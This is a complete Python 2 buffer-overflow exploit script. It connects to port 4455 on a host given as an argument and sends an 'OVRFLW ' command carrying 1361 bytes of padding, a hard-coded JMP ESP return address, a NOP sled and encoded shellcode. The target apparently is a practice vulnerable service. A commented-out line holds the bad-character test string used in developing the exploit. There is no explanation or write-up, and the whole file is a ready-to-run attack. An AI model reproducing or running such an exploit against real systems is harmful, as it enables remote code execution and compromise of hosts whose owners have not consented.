#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

shellcode = "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x41\xcd\x2f\xb6\x83\xeb\xfc\xe2\xf4\xbd\x25\xad\xb6\x41\xcd\x4f\x3f\xa4\xfc\xef\xd2\xca\x9d\x1f\x3d\x13\xc1\xa4\xe4\x55\x46\x5d\x9e\x4e\x7a\x65\x90\x70\x32\x83\x8a\x20\xb1\x2d\x9a\x61\x0c\xe0\xbb\x40\x0a\xcd\x44\x13\x9a\xa4\xe4\x51\x46\x65\x8a\xca\x81\x3e\xce\xa2\x85\x2e\x67\x10\x46\x76\x96\x40\x1e\xa4\xff\x59\x2e\x15\xff\xca\xf9\xa4\xb7\x97\xfc\xd0\x1a\x80\x02\x22\xb7\x86\xf5\xcf\xc3\xb7\xce\x52\x4e\x7a\xb0\x0b\xc3\xa5\x95\xa4\xee\x65\xcc\xfc\xd0\xca\xc1\x64\x3d\x19\xd1\x2e\x65\xca\xc9\xa4\xb7\x91\x44\x6b\x92\x65\x96\x74\xd7\x18\x97\x7e\x49\xa1\x92\x70\xec\xca\xdf\xc4\x3b\x1c\xa5\x1c\x84\x41\xcd\x47\xc1\x32\xff\x70\xe2\x29\x81\x58\x90\x46\x32\xfa\x0e\xd1\xcc\x2f\xb6\x68\x09\x7b\xe6\x29\xe4\xaf\xdd\x41\x32\xfa\xe6\x11\x9d\x7f\xf6\x11\x8d\x7f\xde\xab\xc2\xf0\x56\xbe\x18\xb8\xdc\x44\xa5\xef\x1e\x5f\xd2\x47\xb4\x41\xcc\x94\x3f\xa7\xa7\x3f\xe0\x16\xa5\xb6\x13\x35\xac\xd0\x63\xc4\x0d\x5b\xba\xbe\x83\x27\xc3\xad\xa5\xdf\x03\xe3\x9b\xd0\x63\x29\xae\x42\xd2\x41\x44\xcc\xe1\x16\x9a\x1e\x40\x2b\xdf\x76\xe0\xa3\x30\x49\x71\x05\xe9\x13\xb7\x40\x40\x6b\x92\x51\x0b\x2f\xf2\x15\x9d\x79\xe0\x17\x8b\x79\xf8\x17\x9b\x7c\xe0\x29\xb4\xe3\x89\xc7\x32\xfa\x3f\xa1\x83\x79\xf0\xbe\xfd\x47\xbe\xc6\xd0\x4f\x49\x94\x76\xdf\x03\xe3\x9b\x47\x10\xd4\x70\xb2\x49\x94\xf1\x29\xca\x4b\x4d\xd4\x56\x34\xc8\x94\xf1\x52\xbf\x40\xdc\x41\x9e\xd0\x63"

cmd = "OVRFLW "
junk = "A" * 1361 + "\x83\x66\x62\x65" + "\x90" * 16 + shellcode + "C" * (3500 - 1635 - 346 - 16) 
#jmp esp is at 65626683  or "\x83\x66\x62\x66"
#junk = "A" * 1361 +  "B" * 4 + "\x01\x02\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
 
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
